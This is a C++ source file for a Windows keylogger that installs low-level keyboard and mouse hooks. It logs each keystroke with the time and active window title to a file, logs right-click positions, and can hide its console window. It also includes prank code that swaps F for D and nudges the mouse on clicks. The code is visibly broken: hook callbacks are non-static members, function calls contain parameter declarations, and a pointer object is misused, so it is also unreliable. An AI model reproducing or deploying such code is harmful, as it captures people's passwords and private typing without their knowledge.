#define UNICODE
#include <Windows.h>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>


class KeyLogger {
	private:
		bool visible; // defines whether the window is visible or not
		//mapping of special keys to friendly representation
		const std::map<int, std::string> keyname{ 
		{VK_BACK, 		"[BACKSPACE]" },
		{VK_RETURN,		"\n" },
		{VK_SPACE,		"_" },
		{VK_TAB,		"[TAB]" },
		{VK_SHIFT,		"[SHIFT]" },
		{VK_LSHIFT,		"[LSHIFT]" },
		{VK_RSHIFT,		"[RSHIFT]" },
		{VK_CONTROL,	"[CONTROL]" },
		{VK_LCONTROL,	"[LCONTROL]" },
		{VK_RCONTROL,	"[RCONTROL]" },
		{VK_MENU,		"[ALT]" },
		{VK_LWIN,		"[LWIN]" },
		{VK_RWIN,		"[RWIN]" },
		{VK_ESCAPE,		"[ESCAPE]" },
		{VK_END,		"[END]" },
		{VK_HOME,		"[HOME]" },
		{VK_LEFT,		"[LEFT]" },
		{VK_RIGHT,		"[RIGHT]" },
		{VK_UP,			"[UP]" },
		{VK_DOWN,		"[DOWN]" },
		{VK_PRIOR,		"[PG_UP]" },
		{VK_NEXT,		"[PG_DOWN]" },
		{VK_OEM_PERIOD,	"." },
		{VK_DECIMAL,	"." },
		{VK_OEM_PLUS,	"+" },
		{VK_OEM_MINUS,	"-" },
		{VK_ADD,		"+" },
		{VK_SUBTRACT,	"-" },
		{VK_CAPITAL,	"[CAPSLOCK]" },
		};
		HHOOK hKeybdHook;    //will point to handle to the KEYBOARD hook procedure.
		HHOOK hMouseHook;    //will point to handle to the MOUSE hook procedure.
		const char* output_filename; //TODO: protect length of this char[]. maybe: give default filename / shorten if its too long?
		std::ofstream output_file;	//handle to log file
		int mouse_direction_modifier;

		bool OnLLKeybdHook (int nCode, WPARAM wParam, LPARAM lParam) 
		{
			// for WH_KEYBOARD_LL, non zero nCode must be HC_ACTION ?
			if (wParam == WM_KEYDOWN)
			{
				LPKBDLLHOOKSTRUCT pKeybdHookParam;
				pKeybdHookParam = (LPKBDLLHOOKSTRUCT)lParam;
				/*
					FUNNY ADDTITION HAHA
					simulating keybd events if some condition is met -
						simulating 'D' press upon press on 'F'
						also, stopping hook chain so this key is not actually pressed (:
				*/ 
				if (pKeybdHookParam->vkCode == 0x46) //vitual key-code of 'F' key.
				{ 
					// Simulate a key press on 'D' instead
					keybd_event(0x44,                       // the key 'D'
								0x0,                        // i-net says doesn't matter
								KEYEVENTF_EXTENDEDKEY | 0,  // \?
							0 );                          	// not needed
					// Simulate a key release
					keybd_event(0x44,                       // the key 'D'
							0x0,	                    	// i-net says doesn't matter
							KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP,  // If specified, the key is being released. If not specified, the key is being depressed.
							0);                           	// not needed
					return false;	// will stop hook chain
				}
				//continue to normal processing of keylogger
				else
				{
					// save to file
					this->SaveKeybd(pKeybdHookParam->vkCode);
				}
			}
			return true;
		}

		bool OnLLMouseHook (int nCode, WPARAM wParam, LPARAM lParam) 
		{
			LPMSLLHOOKSTRUCT pMouseHookParam;
			pMouseHookParam = (LPMSLLHOOKSTRUCT)lParam;
			if (wParam == WM_RBUTTONDOWN) {	//if event is of a left mouse button depressed -
				this->SaveMouse(pMouseHookParam->pt);
			}
			/*
			FUNNY ADDTITION HAHA
			simulating mouse events
				simulating movement some pixels aside upon leftclick
				also, passing leftclick press to hook chain only after moving the mouse (:
			*/ 
			else if (wParam == WM_LBUTTONDOWN)
			{
				mouse_event(MOUSEEVENTF_MOVE,
						50*this->mouse_direction_modifier,	// some pixels left or right, depending on sign of direction_modifier
						0, 0, 0);				// not needed to change
				this->mouse_direction_modifier =- mouse_direction_modifier;	// alternate sign of direction_modifier
			}
			return true;
		}

		const char* FormatLogForNewActiveWindow (HWND window, char* to_log) 
		{
			static char lastwindow[256] = "";	//will save window_title of last active window. compared to current window_title.
			char window_title[256];
			GetWindowTextA(window, (LPSTR)window_title, 256);

			if (strcmp(window_title, lastwindow) != 0)
			{
				strcpy_s(lastwindow, sizeof(lastwindow), window_title);

				// get time
				time_t t = time(NULL);
				struct tm tm;
				localtime_s(&tm, &t);
				char s[64];
				strftime(s, sizeof(s), "%c", &tm);

				//TODO: check length of inserted strings (secure from buffer overflow)
				sprintf (to_log, "[Time: %s | Window: %s ]",s, window_title);
			}
			return to_log;
		}

		int SaveKeybd(int keycode)
		{
			std::stringstream output;
			HWND foreground = GetForegroundWindow();
			DWORD threadID;
			HKL layout = NULL;
			char title[300];

			if (foreground)
			{
				//make log title
				this->FormatLogForNewActiveWindow(foreground, title);
				output << title << " - KEYBD PRSS: " ; 

				// get keyboard layout of thread running the window
				threadID = GetWindowThreadProcessId(foreground, NULL);
				layout = GetKeyboardLayout(threadID);	
			}

			// process keycode
			if (this->keyname.find(keycode) != this->keyname.end())		// if is special Key
			{
				output << this->keyname.at(keycode);
			}
			else
			{
				// map virtual key according to keyboard layout
				char key= MapVirtualKeyExA(keycode, MAPVK_VK_TO_CHAR, layout);

				// check for shift/caps modifiers
				// check for caps lock
				bool lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
				// check shift key (inverses an active caps lock)
				if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0
					|| (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
				{
					lowercase = !lowercase;
				}

				// tolower converts it to lowercase properly
				if (!lowercase)
				{
					key = tolower(key);
				}

				output << char(key) << std::endl;
			}
			// instead of opening and closing file handlers every time, keep file open and flush.
			this->output_file << output.str();
			this->output_file.flush();	// TODO: add periodic close + reopen to save the file.

			std::cout << output.str();

			return 0;
		}
		
		int SaveMouse(POINT point)
		{
			std::stringstream output;
			HWND foreground = GetForegroundWindow();
			DWORD threadID;

			char title[300];
			if (foreground)
			{
				//make log title
				this->FormatLogForNewActiveWindow(foreground, title);
				output << title << " - MOUSE RCLK: "; 
			}
			
			char coords[20];
			sprintf (coords, "(%ld, %ld)", point.x, point.y);	//TODO: check length of inserted strings (secure from buffer overflow)
			output << coords << std::endl;
			
			// instead of opening and closing file handlers every time, keep file open and flush.
			this->output_file << output.str();
			this->output_file.flush();	// TODO: add periodic close + reopen to save the file.
			
			std::cout << output.str();

			return 0;
		}

	public:
		// Constructor
		KeyLogger (char* output_filename, bool visible)
		{
			this->visible = visible;
			this->output_filename = ".\\logfile.log";	//DEFAULT - change this
			this->mouse_direction_modifier = 1; // direction - right
			if (this->visible) {
				ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
			} else {
				ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
			}
			// open output file in append mode
			std::cout << "Logging output to " << this->output_filename << std::endl;
			this->output_file.open(this->output_filename, std::ios_base::app);
		}

		LRESULT __stdcall LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
		LRESULT __stdcall LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam);

		// hook SETTER functions
		void SetLowLvLKeybdHook()
		{
			if (!(this->hKeybdHook = SetWindowsHookEx(WH_KEYBOARD_LL, &LowLvlKeybdHookCallback, NULL, 0)))
			{
				LPCWSTR lpText = L"Failed to install keyboard hook!";
				LPCWSTR lpCaption = L"Error";
				MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
			}
		}
		void SetLowLvlMouseHook()
		{
			if (!(this->hMouseHook = SetWindowsHookEx(WH_MOUSE_LL, &LowLvlMouseHookCallback, NULL, 0)))
			{
				LPCWSTR lpText = L"Failed to install mouse hook!";
				LPCWSTR lpCaption = L"Error";
				MessageBox(NULL, lpText, lpCaption, MB_ICONERROR);
			}
		}

		// hook RELEASER functions
		void ReleaseLowLvlKeybdHook()
		{
			UnhookWindowsHookEx(this->hKeybdHook);
		}
		void ReleaseLowLvlMouseHook()
		{
			UnhookWindowsHookEx(this->hMouseHook);
		}
};


extern KeyLogger* logger_obj (false);


LRESULT __stdcall KeyLogger::LowLvlKeybdHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode < 0) {    // do not process the message if nCode less than 0
		return CallNextHookEx(this->hKeybdHook, nCode, wParam, lParam);
	}
	
	bool call_next = logger_obj->OnLLKeybdHook(int nCode, WPARAM wParam, LPARAM lParam);
	//bool call_next = this->OnLLKeybdHook(int nCode, WPARAM wParam, LPARAM lParam);
	if (call_next) 
	{
		return CallNextHookEx(this->hKeybdHook, nCode, wParam, lParam);
	}

}
LRESULT __stdcall KeyLogger::LowLvlMouseHookCallback(int nCode, WPARAM wParam, LPARAM lParam) 

{
	if (nCode < 0) // do not process the message if nCode less than 0
	{
		return CallNextHookEx(this->hMouseHook, nCode, wParam, lParam);
	}

	bool call_next = logger_obj->OnLLMouseHook(int nCode, WPARAM wParam, LPARAM lParam);
	//bool call_next = this->OnLLMouseHook(int nCode, WPARAM wParam, LPARAM lParam);
	if (call_next)
	{
		return CallNextHookEx(this->hMouseHook, nCode, wParam, lParam);
	}
}



int main()
{
	// setting hooks
	logger_obj.SetLowLvLKeybdHook();
	logger_obj.SetLowLvlMouseHook();

	// loop to keep the console application running.
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
        DispatchMessage(&msg);
	}

	// releasing hooks
	logger_obj.ReleaseLowLvlKeybdHook();
	logger_obj.ReleaseLowLvlMouseHook();

	return 0;
}